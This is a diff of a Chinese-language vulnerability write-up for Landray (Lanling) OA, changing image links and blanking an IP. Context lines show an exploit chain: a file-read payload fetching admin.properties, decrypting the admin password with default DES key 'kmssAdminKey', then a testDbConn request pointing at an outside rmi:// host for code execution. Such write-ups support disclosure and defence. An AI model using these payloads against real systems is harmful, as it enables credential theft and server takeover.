@@ -37,11 +37,11 @@ Accept-Encoding: gzip
 var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 ```
 
-![](image/lanling-4.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 获取password后，使用 DES方法 解密，默认密钥为 **kmssAdminKey**
 
-![](image/lanling-5.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 
 
@@ -51,7 +51,7 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 http://xxx.xxx.xxx.xxx/admin.do
 ```
 
-![](image/lanling-6.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 使用工具执行命令
 
@@ -73,7 +73,7 @@ Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
 Sec-Ch-Ua-Mobile: ?0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
-Origin: https://106.12.155.120
+Origin: 
 Content-Type: application/x-www-form-urlencoded
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 
@@ -82,5 +82,5 @@ method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg
 
 
 
-![](image/lanling-7.png)
+![](http://wikioss.peiqi.tech/vuln/lanling-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
